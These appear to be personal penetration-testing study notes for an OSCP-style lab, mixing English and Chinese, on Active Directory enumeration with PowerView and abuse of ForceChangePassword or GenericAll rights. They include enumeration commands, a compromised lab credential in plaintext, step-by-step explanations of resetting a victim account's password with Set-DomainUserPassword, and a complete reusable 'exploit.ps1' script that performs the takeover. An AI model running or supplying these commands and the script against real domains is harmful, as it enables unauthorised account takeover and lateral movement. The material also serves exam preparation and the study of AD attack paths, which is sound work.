
```
import-module .\PowerView.ps1
```

```
Get-ADTrust -Filter *
```

```
Find-DomainShare
```

```
Get-NetUser | select displayname,userprincipalname
```

```
 get-netdomain
```

https://gist.github.com/m1kemu/ca6171696fba51ac65af74199f06749f
# **[invoke-allchecks.ps1](https://gist.github.com/m1kemu/ca6171696fba51ac65af74199f06749f)**

use powerview change password
```
$SecPassword = ConvertTo-SecureString 'BusyOfficeWorker890' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('oscp.exam\r.andrews', $SecPassword)
```
`$SecPassword` 存储的是字符串 `'BusyOfficeWorker890'` 的 **SecureString（安全字符串）** 版本。

- **原始数据：** `'BusyOfficeWorker890'`（明文，Plain Text）。
    
- **转换命令：** `ConvertTo-SecureString -AsPlainText -Force`。
    
- **结果：** `$SecPassword`（加密对象，内存中的 SecureString）。
    

### 2. 为什么要这么麻烦？

你可能会问，为什么不直接把密码传给 `$Cred`？像这样： `$Cred = New-Object ...PSCredential('user', 'BusyOfficeWorker890')` —— **这会报错！**

- **原因：** PowerShell 的 `PSCredential` 类（用于创建凭据对象的类）在其构造函数中，**强制要求**密码必须是 `SecureString` 类型，不能是普通的 `String` 类型。
    
- **目的：** `SecureString` 在内存中是加密存储的，这是一种安全机制，防止密码在内存转储（Memory Dump）中被轻易读取。虽然你在脚本里用了 `-Force` 和明文输入（这在一定程度上破坏了安全性），但为了通过语法检查，你必须这么做。
- 这里将你已经获取到的账号 `oscp.exam\r.andrews` 和密码 `BusyOfficeWorker890` 封装成了一个 PowerShell 的凭据对象 (`$Cred`)。
    
- **目的：** 为了在后续的命令中，以 `r.andrews` 的身份去执行操作，而不是以当前机器上登录的低权限用户身份执行。

```
$UserPassword = ConvertTo-SecureString 'BusyOfficeWorker890' -AsPlainText -Force
```

这段代码是在 PowerShell 中创建一个 **SecureString（安全字符串）** 对象。

简单来说，它的作用是：**把明文密码 `'BusyOfficeWorker890'` 转换成 PowerShell 可以安全处理的加密格式，并赋值给变量 `$UserPassword`。**

以下是这段代码的详细拆解：

### 1. 逐个参数解析

- **`$UserPassword =`**
    
    - 这是变量赋值。转换后的结果（SecureString 对象）将被保存在 `$UserPassword` 这个变量里。
        
- **`'BusyOfficeWorker890'`**
    
    - 这是你的原始输入，也就是你想要使用的密码明文。
        
- **`ConvertTo-SecureString`**
    
    - 这是核心命令。PowerShell 的很多敏感操作（如创建凭据、修改 AD 密码）不接受普通的 `String`（字符串），只接受 `SecureString`。这个命令就是负责做转换的。
        
- **`-AsPlainText`**
    
    - **关键参数。** 默认情况下，`ConvertTo-SecureString` 期望输入的是已经加密过的密文。加上这个参数，是在告诉 PowerShell：“我给你的是一段**明文**，请把它加密起来。”
        
- **`-Force`**
    
    - **强制执行。** PowerShell 认为在脚本中直接写明文密码是不安全的，如果不加 `-Force`，系统会报错或拒绝执行 `-AsPlainText` 的操作。加上它就是告诉系统：“我知道我在做什么，强制转换。”
        

### 2. 这个变量之后怎么用？

在你的攻击脚本上下文中，这个变量通常有两个用途：

1. **作为新密码：** 传递给 `Set-DomainUserPassword`，将目标用户（如 G.JARVIS）的密码重置为这个字符串。
    
2. **构建凭据：** 传递给 `New-Object ...PSCredential`，用来构建一个用于登录或执行命令的身份凭证。
    

### 3. 安全性提示

虽然它叫 "SecureString"，但这种用法其实是**“掩耳盗铃”**：

- **内存中安全：** 一旦转换完成，密码在内存中是加密存储的，这确实比普通字符串安全（防止被内存 dump 读取）。
    
- **脚本中不安全：** 因为你的脚本里直接写着 `'BusyOfficeWorker890'` 这个明文，任何能看到脚本文件的人都能直接看到密码。


```
Set-DomainUserPassword -Identity g.jarvis -AccountPassword $UserPassword -Credential $Cred
```
- **`Set-DomainUserPassword`**:
    
    - 这是 **PowerView** (PowerSploit 框架) 中的一个函数，不是 Windows 自带的命令。
        
    - 它专门用于滥用活动目录（Active Directory）中的权限来重置其他用户的密码。
        
- **`-Identity g.jarvis` (目标)**:
    
    - 这是你的**猎物**。
        
    - 你告诉域控制器：“我要改 **g.jarvis** 这个人的密码。”
        
- **`-AccountPassword $UserPassword` (弹药)**:
    
    - 这是你在上一条命令中准备好的**新密码**（即那个 SecureString 版本的 `'BusyOfficeWorker890'`）。
        
    - 一旦命令成功，g.jarvis 原来的密码就会失效，变成这个新密码。
        
- **`-Credential $Cred` (武器/权限来源)**:
    
    - 这是你在第一步封装好的 **r.andrews** 的凭据。
        
    - 这告诉域控制器：“我是 r.andrews，我有权执行这个操作，请放行。”
        
    - **原理：** 域控制器会检查 r.andrews 的 ACL（访问控制列表），确认他是否有权修改 g.jarvis 的密码。

```
gpupdate /force
```
这条命令 `gpupdate /force` 的含义是 **“强制更新组策略” (Force Group Policy Update)**。

在你刚才展示的“重置用户密码”的攻击链条中，这条命令其实**通常是多余的**，但它在某些特定场景下有其作用。

以下是关于它的详细解释：

### 1. 它实际上在做什么？

- **`gpupdate`**: 这是一个 Windows 原生命令，用于告诉计算机：“去域控制器（DC）那里检查一下，有没有什么新的规则（组策略）需要应用到我身上？”
    
- **`/force`**: 默认情况下，如果策略没有变化，Windows 为了节省资源不会重新应用。`/force` 参数告诉系统：“别管有没有变化，把所有策略重新下载并强制再应用一遍。”
    

### 2. 在你的攻击场景中（修改密码后）

**对于单纯的“重置密码”操作，这条命令是没有任何作用的。**

- **原因：**
    
    - 当你运行 `Set-DomainUserPassword` 时，你是在直接修改域控制器数据库（NTDS.dit）中的用户属性。这仅仅是一个 LDAP 操作。
        
    - 密码的修改在域控制器上是**即时生效**的。
        
    - 组策略（GPO）是关于“系统配置”（如：谁可以登录 RDP、壁纸是什么、防火墙规则等）的，与用户的密码值无关。
        

**所以，在这个脚本末尾加 `gpupdate /force` 有点像是“迷信行为”或者“习惯性动作”，对于让新密码生效来说，它不是必须的。**

### 3. 什么时候真正需要它？

在渗透测试的横向移动中，只有当你修改了**GPO（组策略对象）**本身时，才必须运行它。

**举个例子：** 假设你没有直接改密码，而是创建了一个恶意的组策略（GPO），内容是：“把 `oscp.exam\r.andrews` 添加到本地管理员组”。

1. 你在 DC 上创建了这个 GPO。
    
2. 你想让这个 GPO 在当前这台机器上**立刻生效**。
    
3. 这时，你必须运行 `gpupdate /force`。机器会去 DC 拉取最新的策略，然后把你变成管理员。

how to use powerview ,reset password
### How to Run It

1. **Prerequisite:** Ensure `PowerView.ps1` is in the same folder (or already imported).
    
2. **Command:** Run it using the aliases you defined:

```
<#
.SYNOPSIS
    AD Password Reset Tool (ACL Abuse)
.DESCRIPTION
    Uses PowerView's Set-DomainUserPassword to reset a target user's password 
    using compromised credentials with 'ForceChangePassword' or 'GenericAll' rights.
.EXAMPLE
    .\exploit.ps1 -u1 oscp.exam\r.andws -p Haha890 -u2 G.JARVIS -p2 Password123!
#>
[CmdletBinding()]
param (
    # Attacker Username
    [Parameter(Mandatory=$true)]
    [Alias("u1")]
    [string]$AttackerUser,

    # Attacker Password
    [Parameter(Mandatory=$true)]
    [Alias("p", "p1")]
    [string]$AttackerPass,

    # Target Username
    [Parameter(Mandatory=$true)]
    [Alias("u2")]
    [string]$TargetUser,

    # New Password for Target
    [Parameter(Mandatory=$true)]
    [Alias("p2")]
    [string]$NewPassword
)

process {
    # 0. Check if PowerView is loaded
    if (-not (Get-Command Set-DomainUserPassword -ErrorAction SilentlyContinue)) {
        Write-Warning "PowerView module is NOT loaded. Attempting to import '.\PowerView.ps1'..."
        try { 
            Import-Module .\PowerView.ps1 -ErrorAction Stop 
        }
        catch { 
            Write-Error "Could not find or load PowerView.ps1. Please make sure it is in the current directory."
            return 
        }
    }

    Write-Host "[*] Building credential objects..." -ForegroundColor Cyan
    
    # 1. Prepare Attacker Credentials
    # Convert plain text password to SecureString required by PSCredential
    $SecAttackerPass = ConvertTo-SecureString $AttackerPass -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential($AttackerUser, $SecAttackerPass)

    # 2. Prepare Target Password
    # Convert new password to SecureString required by Set-DomainUserPassword
    $SecNewPassword = ConvertTo-SecureString $NewPassword -AsPlainText -Force

    Write-Host "[*] Attempting to reset password for $TargetUser..." -ForegroundColor Yellow

    try {
        # 3. Execute Attack
        Set-DomainUserPassword -Identity $TargetUser -AccountPassword $SecNewPassword -Credential $Cred -ErrorAction Stop
        
        Write-Host "`n[+] SUCCESS" -ForegroundColor Green
        Write-Host "[+] User: $TargetUser" -ForegroundColor Green
        Write-Host "[+] New Password: $NewPassword" -ForegroundColor Green
        Write-Host "[*] Verify access: runas /netonly /user:$TargetUser powershell"
    }
    catch {
        Write-Host "`n[-] FAILED" -ForegroundColor Red
        Write-Host "[-] Error: $_" -ForegroundColor Red
        Write-Host "[-] Tip: Ensure $AttackerUser has 'ForceChangePassword' or 'GenericAll' rights over $TargetUser." -ForegroundColor Gray
    }
}
```